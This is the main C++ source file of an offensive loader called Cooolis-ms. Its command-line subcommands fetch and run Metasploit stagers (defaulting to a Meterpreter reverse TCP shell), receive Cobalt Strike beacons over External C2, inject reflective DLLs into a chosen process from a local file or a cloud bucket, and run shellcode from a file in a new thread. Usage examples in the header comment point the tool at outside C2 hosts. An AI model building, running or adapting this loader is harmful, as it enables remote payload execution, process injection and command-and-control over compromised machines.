/**************************
Code By Rvn0xsy
https://payloads.online
Email:rvn0xsy@gmail.com

SubCommand : Cobaltstrike External C2

e.g.  Cooolis-ms-x86.exe cobaltstrike -H 1.1.1.1 -P 2222

SubCommand : Metasploit RPC

e.g.  Cooolis-ms-x86.exe metasploit -H 1.1.1.1 -P 2222

SubCommand : Reflective DLL injection

e.g.  Cooolis-ms-x86.exe reflective -f reflective_dll.dll -p PID
e.g.  Cooolis-ms-x86.exe reflective -b XXX.oss-cn-XXX.aliyuncs.com -u /reflective86.dll

***************************/



#include "Cooolis-msf.h"
#include "Cooolis-ExternalC2.h"
#include "Cooolis-Reflective.h"
#include "Cooolis-Http.h"
#include "Cooolis-Shellcode.h"
#include "rang.hpp"
#include "CLI11.hpp"
#include <codecvt> 

int main(int argc, char** argv)
{
	USHORT server_port = 8899;
	std::string msf_payload = "";
	std::string msf_options = "";
	std::string server_host = "";
	std::string reflective_oss_bucket = "";
	std::string reflective_file = "";
	std::string reflective_uri_file = "";
	std::string shellcode_file = "";
	DWORD dwReflectiveProcessId = NULL;
	CLI::App app{ "Version v1.1.4" };

	app.require_subcommand(1);


	// [Metasploit]
	auto metasploit = app.add_subcommand("metasploit", "Metasploit RPC Loader");
	

	metasploit->add_option("-p,--payload", msf_payload, "Payload Name, e.g. windows/meterpreter/reverse_tcp")->default_str("windows/meterpreter/reverse_tcp");
	metasploit->add_option("-o,--options", msf_options, "Payload options, e.g. LHOST=1.1.1.1,LPORT=8866");
	

	metasploit->add_option("-P,--PORT", server_port, "RPC Server Port")->check(CLI::Range(1, 65535))->default_val(8899)->required();
	metasploit->add_option("-H,--HOST", server_host, "RPC Server Host")->check(CLI::ValidIPV4)->required();

	metasploit->callback([&]() {
		if (msf_options.length() > 200 || msf_payload.length() > 200) {
			std::cout << rang::bg::red << rang::style::bold << rang::fg::cyan << "PType And POptions Too long!" << std::endl;
		}
		else {
			CCooolisMetasploit* CooolisMSF = new CCooolisMetasploit;

			if (CooolisMSF->ConnectServer(server_host, server_port)) {
				CooolisMSF->SendPayload(msf_options, msf_payload);
				CooolisMSF->RecvStage();
				CooolisMSF->GoodCooolis();
			}

			delete CooolisMSF;
		}
	});

	// [Cobaltstrike]
	auto cobaltstrike = app.add_subcommand("cobaltstrike", "Cobalt Strike External C2 Loader");
	cobaltstrike->add_option("-P,--PORT", server_port, "External C2 Port")->check(CLI::Range(1, 65535))->required();
	cobaltstrike->add_option("-H,--HOST", server_host, "External C2 Host")->check(CLI::ValidIPV4)->required();

	cobaltstrike->callback([&]() {
		CCooolisExternalC2* CooolisCobaltstrike = new CCooolisExternalC2;
		if (CooolisCobaltstrike->ConnectServer(server_host, server_port) != FALSE) {
			CooolisCobaltstrike->SendOptions();
			CooolisCobaltstrike->RecvPayload();
			CooolisCobaltstrike->HandleBeacon();
		}
	});

	// [Reflective]
	auto reflective = app.add_subcommand("reflective", "Reflective DLL injection");
	reflective->add_option("-f,--file", reflective_file, "Reflective DLL Path")->check(CLI::ExistingFile);
	reflective->add_option("-u,--uri", reflective_uri_file, "Reflective DLL URI");
	reflective->add_option("-b,--bucket", reflective_oss_bucket, "Reflective DLL OSS Bucket");
	reflective->add_option("-p,--pid", dwReflectiveProcessId, "Reflective Inject Process Id")->default_val(GetCurrentProcessId());

	reflective->callback([&]() {
		CCooolisReflective* CooolisReflective = new CCooolisReflective;
		// 优先尝试本地加载
		if (reflective_file.empty() == FALSE) {
			CooolisReflective->ReflectiveInject(dwReflectiveProcessId, reflective_file);
		}else {
			// 如果oss bucket和URI为空，则抛出错误提示
			if (reflective_oss_bucket.empty() || reflective_uri_file.empty()) {
				std::cout << "[*] The Bucket or Reflective DLL URI is Empty." << std::endl;
				std::cout << app.help() << std::endl;
				return FALSE;
			}
			// 正常执行....

			CCooolisHttp* CooolisHttp = new CCooolisHttp;

			LPVOID lpBuffer = NULL; // DLL 内存地址
			DWORD dwBufferSize = 0; // DLL 大小


			std::wstring reflective_oss_bucket_ws, reflective_uri_file_ws;
			std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
			reflective_oss_bucket_ws = converter.from_bytes(reflective_oss_bucket);
			reflective_uri_file_ws = converter.from_bytes(reflective_uri_file);

			// 连接OSS
			if (!CooolisHttp->ConnectServer(reflective_oss_bucket_ws.data(), 443)) {
				std::cout << "[*] Can't Connect Aliyun Bucket." << std::endl;
				std::cout << app.help() << std::endl;
				return FALSE;
			}

			lpBuffer = CooolisHttp->ReadHttpFile(reflective_uri_file_ws.data(), dwBufferSize); // 读取文件
			
			CooolisReflective->ReflectiveInject(dwReflectiveProcessId, lpBuffer, dwBufferSize); // 注入DLL

			// 释放内存
			HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpBuffer);
			delete CooolisHttp;
		}
		delete CooolisReflective;
		return TRUE;
	});


	// [Shellcode]
	auto shellcode = app.add_subcommand("shellcode", "Shellcode Loader");
	shellcode->add_option("-f,--file", shellcode_file, "Shellcode Path")->check(CLI::ExistingFile);

	shellcode->callback([&]() {
		DWORD dwFileSize = 0;
		CCooolisShellcode* CooolisShellcode = new CCooolisShellcode;

		dwFileSize = CooolisShellcode->LoadeShellcodeFile(shellcode_file);
		if (dwFileSize == 0) {
			return FALSE;
		}
		CooolisShellcode->ConvertShellcodeByCHAR(dwFileSize);
		CooolisShellcode->CreateThreadRun(); // 从油槽读取
		delete CooolisShellcode;
		return TRUE;
	});


	try {
		CLI11_PARSE(app, argc, argv);
	}
	catch (const CLI::ParseError& e) {
		std::cout << app.help() << std::endl;
		return app.exit(e);
	}

	return GetLastError();
}

